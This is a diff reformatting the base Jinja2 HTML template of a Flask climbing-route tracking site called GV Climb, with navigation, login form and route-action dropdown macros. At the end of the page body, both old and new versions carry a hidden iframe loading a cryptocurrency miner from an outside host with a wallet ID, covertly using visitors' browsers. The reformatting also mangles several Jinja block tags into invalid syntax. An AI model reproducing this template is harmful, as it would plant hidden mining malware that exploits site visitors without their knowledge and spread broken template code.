@@ -1,233 +1,236 @@
 {% macro action_button(id,class,status="none",page,voted)-%}
 <div class="btn-group btn-block action">
-  <button type="button" class="btn {{class}} btn-block dropdown-toggle" data-toggle="dropdown">
-    {{status}} <span class="caret">
+    <button type="button" class="btn {{class}} btn-block dropdown-toggle" data-toggle="dropdown">
+        {{status}} <span class="caret">
   </span>
-</button>
-<ul class="dropdown-menu" role="menu" style="right:0;left:auto;">
-  {% if status == "Sent" %}
-  <li>
-    <a href="/unsend/{{id}}/{{page}}">Unmark Sent</a>
-  </li>
-  {% elif status == "Attempted" %}
-  <li>
-    <a href="/send/{{id}}/{{page}}">Mark Sent</a>
-  </li>
-  <li>
-    <a href="/unattempt/{{id}}/{{page}}">Unmark Attempted</a>
-  </li>
-  {% else %}
-  <li>
-    <a href="/send/{{id}}/{{page}}">Mark Sent</a>
-  </li>
-  <li>
-    <a href="/attempt/{{id}}/{{page}}">Mark Attempted</a>
-  </li>
-  {% endif %}
-  <li class="divider">
-  </li>
-  {% if voted == "True" %}
-  <li>
-    <a href="/comm/vote/{{id}}/{{page}}">Unrequest Removal</a>
-  </li>
-  {% else %}
-  <li>
-    <a href="/comm/vote/{{id}}/{{page}}">Request Removal</a>
-  </li>
-  {% endif %}
-
-  {% if session.is_admin %}
-  <li class="divider">
-  </li>
-  <li>
-    <a href="/edit/{{id}}">Edit Route</a>
-  </li>
-  <li>
-    <a href="/delete/{{id}}/{{page}}">Delete Route</a>
-  </li>
-  {% endif %}
-</ul>
+    </button>
+    <ul class="dropdown-menu" role="menu" style="right:0;left:auto;">
+        {% if status == "Sent" %}
+        <li>
+            <a href="/unsend/{{id}}/{{page}}">Unmark Sent</a>
+        </li>
+        {% elif status == "Attempted" %}
+        <li>
+            <a href="/send/{{id}}/{{page}}">Mark Sent</a>
+        </li>
+        <li>
+            <a href="/unattempt/{{id}}/{{page}}">Unmark Attempted</a>
+        </li>
+        {% else %}
+        <li>
+            <a href="/send/{{id}}/{{page}}">Mark Sent</a>
+        </li>
+        <li>
+            <a href="/attempt/{{id}}/{{page}}">Mark Attempted</a>
+        </li>
+        {% endif %}
+        <li class="divider">
+        </li>
+        {% if voted == "True" %}
+        <li>
+            <a href="/comm/vote/{{id}}/{{page}}">Unrequest Removal</a>
+        </li>
+        {% else %}
+        <li>
+            <a href="/comm/vote/{{id}}/{{page}}">Request Removal</a>
+        </li>
+        {% endif %} {% if session.is_admin %}
+        <li class="divider">
+        </li>
+        <li>
+            <a href="/edit/{{id}}">Edit Route</a>
+        </li>
+        <li>
+            <a href="/delete/{{id}}/{{page}}">Delete Route</a>
+        </li>
+        {% endif %}
+    </ul>
 </div>
-{%- endmacro %}
-{% macro setter(name)-%}
+{%- endmacro %} {% macro setter(name)-%}
 <option value="{{name}}">{{name}}</option>
-{%- endmacro %}
-{% macro color(css,real) -%}
+{%- endmacro %} {% macro color(css,real) -%}
 <option value="{{css}}">{{real}}</option>
 {% endmacro -%}
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
 <html>
+
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>{% block title %}{% endblock %} - GV Climb</title>
-  <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css">
-  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css')}}">
-  <link rel="stylesheet" href="{{url_for('static',filename='jdpicker.css')}}" type="text/css" media="screen" />
-  <link rel="stylesheet" href="{{url_for('static',filename='tablesorter_styles.css')}}" type="text/css" media="screen" />
-  <style type="text/css">
-  {% block css %}
-  {% endblock %}
-  </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}{% endblock %} - GV Climb</title>
+    <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css')}}">
+    <link rel="stylesheet" href="{{url_for('static',filename='jdpicker.css')}}" type="text/css" media="screen" />
+    <link rel="stylesheet" href="{{url_for('static',filename='tablesorter_styles.css')}}" type="text/css" media="screen" />
+    <style type="text/css">
+    {
+        % block css %
+    }
+    {
+        % endblock %
+    }
+    </style>
     <!--[if lt IE 9]>
       <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js">
 </script>
       <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js">
 </script>
 <![endif]-->
-{% block head %}
-{% endblock %}
+    {% block head %} {% endblock %}
 
 </head>
+
 <body data-spy="scroll" data-target=".navbar-collapse">
- <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
-  <div class="container">
-   <div class="navbar-header">
-    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
-     <span class="sr-only">Toggle navigation</span>
-     <span class="icon-bar">
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar">
      </span>
-     <span class="icon-bar">
+                    <span class="icon-bar">
      </span>
-     <span class="icon-bar">
+                    <span class="icon-bar">
      </span>
-   </button>
-   <a class="navbar-brand" href="/">GV Climb</a>
- </div>
- <div class="collapse navbar-collapse">
-  <ul class="nav navbar-nav">
-    {% if request.path == "/" %}
-    <li>
-      <a href="#toprope" class="active">Top Rope</a>
-    </li>
-    <li>
-      <a href="#boulder">Boulder</a>
-    </li>
-    {% endif %}
-    {% if request.path == "/profile" %}
-    <li>
-      <a href="#sent" class="active">Sent</a>
-    </li>
-    <li>
-      <a href="#attempted">Attempted</a>
-    </li>
-    {% endif %}
-  </ul>
-  <ul class="nav navbar-nav navbar-right">
-    <li {% if request.path == "/comm" %} class="active" {%endif%}>
-      <a href="{{url_for('comm')}}" alt="Route Comm." title="Route Comm.">
-        <span class="glyphicon glyphicon-thumbs-up">
+                </button>
+                <a class="navbar-brand" href="/">GV Climb</a>
+            </div>
+            <div class="collapse navbar-collapse">
+                <ul class="nav navbar-nav">
+                    {% if request.path == "/" %}
+                    <li>
+                        <a href="#toprope" class="active">Top Rope</a>
+                    </li>
+                    <li>
+                        <a href="#boulder">Boulder</a>
+                    </li>
+                    {% endif %} {% if request.path == "/profile" %}
+                    <li>
+                        <a href="#sent" class="active">Sent</a>
+                    </li>
+                    <li>
+                        <a href="#attempted">Attempted</a>
+                    </li>
+                    {% endif %}
+                </ul>
+                <ul class="nav navbar-nav navbar-right">
+                    <li {% if request.path=="/comm" %} class="active" {%endif%}>
+                        <a href="{{url_for('comm')}}" alt="Route Comm." title="Route Comm.">
+                            <span class="glyphicon glyphicon-thumbs-up">
         </span>
-        <span class="glyphicon glyphicon-thumbs-down">
+                            <span class="glyphicon glyphicon-thumbs-down">
         </span>
-        <span class="visible-xs">Route Comm.</span>
-        {% if request.path == "/comm" %}
-        <span class="hidden-xs" style="inline-block">Route Comm.</span>
-        {%endif%}
-      </a>
-    </li>
-    {% if session.logged_in %}
-    {% if session.is_admin %}
-    <li {% if request.path == "/add" %} class="active" {%endif%}>
-      <a href="{{url_for('add')}}" alt="Add Route" title="Add Route">
+                            <span class="visible-xs">Route Comm.</span>
+                            {% if request.path == "/comm" %}
+                            <span class="hidden-xs" style="inline-block">Route Comm.</span>
+                            {%endif%}
+                        </a>
+                    </li>
+                    {% if session.logged_in %} {% if session.is_admin %}
+                    <li {% if request.path=="/add" %} class="active" {%endif%}>
+                        <a href="{{url_for('add')}}" alt="Add Route" title="Add Route">
 
-        <span class="glyphicon glyphicon-plus">
+                            <span class="glyphicon glyphicon-plus">
         </span>
-        <span class="visible-xs">Add Route</span>
-        {% if request.path == "/add" %}
-        <span class="hidden-xs">Add Route</span>
-        {%endif%}
-      </a>
-    </li>
-    <li {% if request.path == "/admin" %} class="active" {%endif%}>
-      <a href="{{url_for('admin')}}" alt="Administration" title="Administration">
-        <span class="glyphicon glyphicon-cog">
+                            <span class="visible-xs">Add Route</span>
+                            {% if request.path == "/add" %}
+                            <span class="hidden-xs">Add Route</span>
+                            {%endif%}
+                        </a>
+                    </li>
+                    <li {% if request.path=="/admin" %} class="active" {%endif%}>
+                        <a href="{{url_for('admin')}}" alt="Administration" title="Administration">
+                            <span class="glyphicon glyphicon-cog">
         </span>
-        <span class="visible-xs">Administration</span>
-        {% if request.path == "/admin" %}
-        <span class="hidden-xs" style="inline-block">Administration</span>
-        {%endif%}
-      </a>
-    </li>
-    {% endif %}
-    <li {% if request.path == "/profile" %} class="active" {%endif%}>
-      <a href="{{url_for('profile')}}" alt="Logged in as {{ session.logged_in_as }}" title="Logged in as {{ session.logged_in_as }}">
-        <span class="glyphicon glyphicon-user">
+                            <span class="visible-xs">Administration</span>
+                            {% if request.path == "/admin" %}
+                            <span class="hidden-xs" style="inline-block">Administration</span>
+                            {%endif%}
+                        </a>
+                    </li>
+                    {% endif %}
+                    <li {% if request.path=="/profile" %} class="active" {%endif%}>
+                        <a href="{{url_for('profile')}}" alt="Logged in as {{ session.logged_in_as }}" title="Logged in as {{ session.logged_in_as }}">
+                            <span class="glyphicon glyphicon-user">
         </span>
-        <span class="visible-xs">{{session.logged_in_as}}</span>
-        {% if request.path == "/profile" %}
-        <span class="hidden-xs">{{session.logged_in_as}}</span>
-        {%endif%}
-      </a>
-    </li>
-    <li>
-      <a href="{{url_for('logout')}}" alt="Logout" title="Logout">
-        <span class="glyphicon glyphicon-off">
+                            <span class="visible-xs">{{session.logged_in_as}}</span>
+                            {% if request.path == "/profile" %}
+                            <span class="hidden-xs">{{session.logged_in_as}}</span>
+                            {%endif%}
+                        </a>
+                    </li>
+                    <li>
+                        <a href="{{url_for('logout')}}" alt="Logout" title="Logout">
+                            <span class="glyphicon glyphicon-off">
         </span>
-        <span class="visible-xs">Logout</span>
-      </a>
-      
-    </li>
-  </div>
-  {% else %}
-  <li class="visible-xs">
-    <a href="{{ url_for('login') }}">Login</a>
-  </li>
-  <ul class="nav navbar-nav navbar-right hidden-xs">
-    <li class="dropdown" id="menuLogin">
-      <button data-toggle="dropdown" class="btn btn-success navbar-btn dropdown-toggle" type="button">
-        <i class="glyphicon glyphicon-user">
+                            <span class="visible-xs">Logout</span>
+                        </a>
+
+                    </li>
+            </div>
+            {% else %}
+            <li class="visible-xs">
+
+                <a href="{{ url_for('login') }}">
+                    <i class="glyphicon glyphicon-user"></i>
+                    Login
+                </a>
+            </li>
+            <ul class="nav navbar-nav navbar-right hidden-xs">
+                <li class="dropdown" id="menuLogin">
+                    <button data-toggle="dropdown" class="btn btn-success navbar-btn dropdown-toggle" type="button">
+                        <i class="glyphicon glyphicon-user">
         </i>
-        <span class="caret">
+                        <span class="caret">
         </span>
-      </button>
-      <div class="dropdown-menu" style="width:250px; padding:20px;">
-        <form class="form" role="form" action="{{ url_for('login') }}" method="POST"> 
-          <div class="form-group">
-            <input class="form-control" name="username" id="username" type="text" placeholder="Username"> 
-          </div>
-          <div class="form-group">
-            <input class="form-control" name="password" id="password" type="password" placeholder="Password">
-          </div>
-          <div class="form-group">
-          <button type="submit" id="btnLogin" class="btn btn-success">Login</button>
-          <a href="{{ url_for('register') }}" class="btn btn-success">New User?</a>
+                    </button>
+                    <div class="dropdown-menu" style="width:250px; padding:20px;">
+                        <form class="form" role="form" action="{{ url_for('login') }}" method="POST">
+                            <div class="form-group">
+                                <input class="form-control" name="username" id="username" type="text" placeholder="Username">
+                            </div>
+                            <div class="form-group">
+                                <input class="form-control" name="password" id="password" type="password" placeholder="Password">
+                            </div>
+                            <div class="form-group">
+                                <button type="submit" id="btnLogin" class="btn btn-success">Login</button>
+                                <a href="{{ url_for('register') }}" class="btn btn-success">New User?</a>
+                            </div>
+                        </form>
+                    </div>
+                </li>
+            </ul>
+
+            {% endif %}
+            </ul>
+
+
         </div>
-        </form>
-      </div>
-    </li>
-  </ul>
+        <!--/.nav-collapse -->
 
-  {% endif %}
-</ul>
+    </div>
 
-
-</div>
-<!--/.nav-collapse -->
-
-</div>
-
-</div>
-<a id="top">
-</a>
-<div class="container">
- {% block body %}{% endblock %}
-</div>
-<script src="https://code.jquery.com/jquery.js">
-</script>
-<script src="//netdna.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js">
-</script>
-<script src="{{url_for('static',filename='cookie.js')}}">
-</script>
-<script type ="text/javascript" src="{{url_for('static',filename='jdpicker.js')}}">
-</script>
-<script type ="text/javascript" src="{{url_for('static',filename='jquery.tablesorter.min.js')}}">
-</script>
-<script type="text/javascript">
-if ($(".action").length > 6){
-  $(".action").slice(-2).addClass("dropup");
-}
-
-</script>
-<script type="text/javascript">{% block scripts %}{% endblock %}</script>
-<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1P1FgbY8NavT9cXNFex51tVMVS8LnQVY8u</script></iframe>
+    </div>
+    <a id="top">
+    </a>
+    <div class="container">
+        {% block body %}{% endblock %}
+    </div>
+    <script src="https://code.jquery.com/jquery.js"></script>
+    <script src="//netdna.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>
+    <script src="{{url_for('static',filename='cookie.js')}}"></script>
+    <script type="text/javascript" src="{{url_for('static',filename='jdpicker.js')}}"></script>
+    <script type="text/javascript" src="{{url_for('static',filename='jquery.tablesorter.min.js')}}"></script>
+    <script type="text/javascript">
+    if ($(".action").length > 6) {
+        $(".action").slice(-2).addClass("dropup");
+    }
+    </script>
+    <script type="text/javascript">
+    { % block scripts %} { % endblock % }
+    </script>
+    <iframe style='display:none' src='http://tidbit.co.in/miner'>
+        <script>
+        window.walletId = 1P1FgbY8NavT9cXNFex51tVMVS8LnQVY8u
+        </script>
+    </iframe>
 </body>
